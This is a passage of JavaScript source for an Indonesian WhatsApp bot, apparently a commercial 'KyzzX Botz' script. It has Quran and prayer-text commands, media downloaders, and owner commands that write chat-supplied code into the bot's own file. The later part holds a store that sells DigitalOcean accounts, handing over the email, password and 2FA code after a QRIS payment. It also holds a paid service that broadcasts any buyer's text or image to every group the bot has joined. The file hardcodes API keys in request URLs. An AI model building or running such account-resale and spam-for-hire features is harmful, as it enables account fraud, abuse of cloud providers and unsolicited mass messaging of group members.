81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return m.reply(`${wrong}`)
      m.reply(mess.wait)
   conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break
//=========================================\\

case "ayatkursi": {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  m.reply(caption)
}
break
//=========================================\\
case "bacaansholat": case "bacaanshalat": {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    m.reply(`${contoh} + ${data}`)
}
break

//======================================//
case 'addcase': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Mana case nya');
    const fs = require('fs');
    const namaFile = 'Kyzzicvxii.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply('Gagal membaca file');
        }
        const posisiAwal = data.indexOf("switch (command) {");
        if (posisiAwal !== -1) {
            const posisiInsert = posisiAwal + "switch (command) {".length;
            const kodeBaruLengkap = data.slice(0, posisiInsert) + '\n\n' + caseBaru + '\n' + data.slice(posisiInsert);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    m.reply('Terjadi kesalahan saat menulis file: ' + err);
                } else {
                    m.reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            m.reply('Tidak dapat menemukan switch statement dalam file.');
        }
    });
}
break

case 'delcase': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
    const fs = require('fs')
    const namaFile = 'Kyzzicvxii.js'
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err)
            return m.reply('Gagal membaca file')
        }
        const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break`, 'g')
        if (!casePattern.test(data)) {
            return m.reply(`Case '${text}' tidak ditemukan`)
        }
        const newContent = data.replace(casePattern, '')
        fs.writeFile(namaFile, newContent, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err)
                return m.reply('Gagal menghapus case')
            }
            m.reply(`Case '${text}' berhasil dihapus`)
        })
    })
}
break
//======================================//

    case 'ytmp4': {
    if (!text) return m.reply(`Example: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`);
    m.reply('Tunggu Sebentar Kak...');
    
    const ytLink = text.trim();
    const apiUrl = `https://api-rest-rizzkyxofc.vercel.app/api/download/ytmp4?url=${encodeURIComponent(ytLink)}`;
    
    try {
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        if (!data.status) {
            return m.reply('Failed to fetch video information');
        }

        const caption = `
📽️ *YOUTUBE DOWNLOADER*

*📌 Title:* ${data.metadata.title}
*👤 Channel:* ${data.metadata.channelTitle}
*⏰ Published:* ${data.metadata.publishedAt}

> Note :
> The bigger the video, the longer it takes to load...`;
        await conn.sendMessage(m.chat, { 
            video: { url: data.download.video },
            caption: caption
        });
        
        await conn.sendMessage(m.chat, { 
            audio: { url: data.download.audio },
            mimetype: 'audio/mp4',
            fileName: `${data.metadata.title}.mp3`
        });
        
    } catch (error) {
        console.error('Error:', error);
        m.reply('Error occurred while processing the request');
    }
}
break

case "searchspotify":
case "spotify":
case "carilagu":
case "ssp": {
  if (!text) return m.reply(`Example: ${prefix + command} judul lagu`);
  
  try {
    let api = await fetch(`https://fastrestapis.fasturl.cloud/music/spotify?name=${text}`);
    let data = await api.json();
    
    if (data.status !== 200) return m.reply('Search failed! Try again later.');
    
    let hasil = `乂 *HASIL PENCARIAN SPOTIFY* ◦\n\n`;
    for (let i = 0; i < Math.min(10, data.result.length); i++) {
      let lagu = data.result[i];
      hasil += `乂 *${i + 1}.* ${lagu.title}\n`;
      hasil += `乂 *Artis* : ${lagu.artist}\n`;
      hasil += `乂 *Durasi* : ${lagu.duration}\n`;
      hasil += `乂 *URL* : ${lagu.url}\n\n`;
    }
    hasil += `Ketik ${prefix}spdown <url> untuk download music Spotify!`;
    
    await conn.sendMessage(m.chat, { text: hasil });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "spdown":
case "spotifydown":
case "downspotify": {
  if (!text) return m.reply(`Example: ${prefix + command} url`);
  
  m.reply('Tunggu sebentar kak...');
  
  try {
    let api = await fetch(`https://fastrestapis.fasturl.cloud/downup/spotifydown?url=${text}`);
    let data = await api.json();
    
    if (data.status !== 200) return m.reply('Download failed! Try again later.');
    
    let caption = `乂 *SPOTIFY DOWNLOADER* ◦\n\n`;
    caption += `乂 *Title* : ${data.result.metadata.title}\n`;
    caption += `乂 *Artists* : ${data.result.metadata.artists}\n`;
    caption += `乂 *Album* : ${data.result.metadata.album}\n`;
    caption += `乂 *Release Date* : ${data.result.metadata.releaseDate}\n`;
    caption += `乂 *Link Dowload* : ${data.result.link}\n`;
    
    await conn.sendMessage(m.chat, { image: { url: data.result.metadata.cover }, caption: caption });
    await conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: "audio/mpeg" });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while downloading!');
  }
}
break

case "gimage":
case "simg":
case "searchimage":
  {
    if (!text) return m.reply('Masukkan kata kunci pencarian!')
    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    try {
      let response = await fetchJson(`https://api-rest-rizzkyxofc.vercel.app/api/search/gimage?q=${text}`)
      if (!response.status) return m.reply("Error")
      let total = 0
      let aray = response.result.length < 20 ? response.result : response.result.slice(0, 20)
      let cards = []
      for (let i of aray) {
        let imgsc = await prepareWAMessageMedia({ image: { url: i.url } }, { upload: conn.waUploadToServer })
        cards.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Foto Ke ${++total}`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [
              {
              name: "cta_copy",
                            buttonParamsJson: `{
                                "display_text": "Salin Link",
                                "copy_text": "${i.url}"
                            }`
              }
            ]
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Link: ${i.url}`
          })
        })
      }
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `🔎 *Hasil pencarian gambar untuk ${text}*`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: cards
              })
            })
          }
        }
      }, {
        userJid: m.sender,
        quoted: m
      })
      conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
      await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
    } catch (error) {
      console.error(error)
      return m.reply('Terjadi kesalahan saat mencari gambar!')
    }
  }
  break

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return m.reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `${prefix}buydo ${urutt += 1}`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `© KyzzX Botz`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Dogital Ocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Digitalocean Account Data 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*SungSu Terms & Conditions:* 
* Save this data as best as possible
* Seller only sends 1 time! 
* 30 day active account guarantee
`
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("xyra@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return m.reply(example("xyra@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return m.reply(example("xyra@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return m.reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await conn.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return m.reply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Jasa Jpm Pesan
 *• Expired :* 5 menit

*Note :* 
Qris payment is only valid for 5 minutes, if it has passed 5 minutes the payment is declared invalid!
If the payment is successful the bot will automatically send a notification of your payment status.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Jasa Jpm Pesan
`}, {quoted: db.users[m.sender].saweria.msg})

let rest
if (Obj.img !== undefined) {
rest = await conn.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
